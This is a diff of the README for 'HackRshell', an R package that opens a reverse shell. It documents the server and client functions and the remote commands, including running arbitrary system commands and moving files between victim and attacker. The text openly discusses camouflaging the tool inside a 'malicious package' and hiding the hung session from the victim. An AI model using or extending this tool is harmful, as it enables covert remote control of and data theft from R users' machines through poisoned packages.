@@ -45,12 +45,12 @@ From here you can start running the commands below. Once you are finished, use t
 These can also be found in the R documentation for the HackRshell package. After installing the package, run `?HackRshell` to see the docs.
 
 ```
-hRs.server(host="localhost", port=4471, secondaryPort=5472)
+hRs.server(host="localhost", port=4471)
 
-hRs.client(host="localhost", port=4471, secondaryPort=5472)
+hRs.client(host="localhost", port=4471)
 ```
 
-Where `host` is the IPv4 address of the server, `port` is the TCP port number the server will listen on and send commands with, and `secondaryPort` is the port number the server will use to download or upload files. 
+Where `host` is the IPv4 address of the server and `port` is the TCP port number the server will listen on and send commands and data with.
 
 ## List of Commands:
 
@@ -66,9 +66,9 @@ Commands are case-sensitive. Parentheses indicate multiple names for the same co
 
   - **(cat, type) \[filename\]**: view the contents of \[filename\] as text if it is in the working directory. Will not work on files that contain non-text characters. (To view the contents of these files in the terminal, consider "sys \[cat/type\] \[filename\]", see the sys command below.)
 
-  - **download \[filename\]**: opens a new socket connection with server port number `secondaryPort` and sends the file \[filename\] from the client to the server. This command can only download files, not directories.
+  - **download \[filename\]**: sends the file \[filename\] from the client to the server. This command can only download files, not directories.
 
-  - **upload \[filename\]**: opens a new socket connection with server port number `secondaryPort` and sends the file \[filename\] from the server to the client. This command can only upload files, not directories. 
+  - **upload \[filename\]**: sends the file \[filename\] from the server to the client. This command can only upload files, not directories. 
 
   - **sys \[command\] \[args\]**: Passes \[command\] with \[args\] to the system as a system call. For example, on Windows the "systeminfo" command is run with "sys systeminfo". See the R documentation for system() and system2() for how Windows and Unix-like OSes differ in how this command is executed.
 
@@ -80,15 +80,13 @@ All other strings will result in a "Command '_____' not recognized" response.
 
 - The command socket has a timeout of 24 hours, increased from the R default of 1 minute. So don't leave the reverse shell idle for longer than 24 hours, or you will silently lose the connection.
 
--  In order to keep the transmissions to a single line for the `readLines()` function, newline characters sent from the client are encoded as the string `%&%` before being sent to the server for decoding. While it's not likely to come up, if a command output happens to contain that string naturally, it will get replaced with a newline. (Downloading and uploading files are not affected by this, as those functions use a separate socket and separate read/write functions.)
+-  In order to keep the transmissions to a single line for the `readLines()` function, newline characters sent from the client are encoded as the string `%&%` before being sent to the server for decoding. While it's not likely to come up, if a command output happens to contain that string naturally, it will get replaced with a newline. (Downloading and uploading files are not affected by this, as those functions use separate read/write functions and don't need to encode newlines.)
 
 ## Known Issues: 
 
 - The target R session very obviously hangs when the reverse shell starts. This is something that is listed in the next section as a potential improvement and is a likely next step, but the benefit of this library as it stands is that it runs entirely in base R. This means no additional packages are required to run this reverse shell on either the client or the server side. Parallel computing or process interaction packages would be required to spawn a new R session, though this can be camouflaged by adding these libraries as a dependency to the malicious package. 
 
-- If the server and client are on different machines, the download and upload functions will fail to open the secondary socket to send the file. I'm not sure why this is, and it seems to be something to work around rather than fix: is there a way to encode and decode raw binary data into the same socket as the text commands using only base R? Or will I have to concede and use a base64 encode/decode library? 
-
-- As of 10 August 2022, this reverse shell has not been able to be tested on two separate physical machines. This is due mainly to a lack of compatible hardware to set up the connection. Tests with a pair of networked virtual machines have been performed, and was how the second issue on this list was discovered. 
+- As of 10 August 2022, this reverse shell has not been able to be tested on two separate physical machines. This is due mainly to a lack of compatible hardware to set up the connection. Tests with a pair of networked virtual machines have been performed.
 
 ## Potential Improvements: 
 
@@ -100,8 +98,6 @@ All other strings will result in a "Command '_____' not recognized" response.
 
 - Create a similar package with a multiprocessing library to transparently spawn a new process or R session in the background when the `hRs.client()` function is run, thus allowing the client to execute without obviously hanging the victim's R session. This could all be handled in the `.onAttach()` function and keeping the `hRs.client()` function the same. 
 
-- Add the ability to change `secondaryPort` remotely, mid-session. 
-
 - Add the ability to download or upload directories recursively. (R does support recursive functions, so this might not be too difficult.)
 
 - Add some sort of automated testing function or file. 
@@ -112,7 +108,7 @@ All other strings will result in a "Command '_____' not recognized" response.
 
 - Use a `serverSocket()` function instead of `socketConnection()` to handle multiple clients, possibly with multithreading libraries to handle each one. 
 
-- Write a Python implementation of the serve side, so the user doesn't need the R interpreter installed. (I've been trying, but getting the Python and R sockets to play nice is difficult. In particular, the download and upload commands don't work at all, the secondary connection always fails to open for reasons that I don't understand.)
+- Write a Python implementation of the serve side, so the user doesn't need the R interpreter installed. (I've been trying, but getting the Python and R sockets to play nice is difficult. In particular, the original download and upload commands didn't work at all. Now that those commands no longer use secondary connections, this might work now.)
 
 ## Personal Note
 
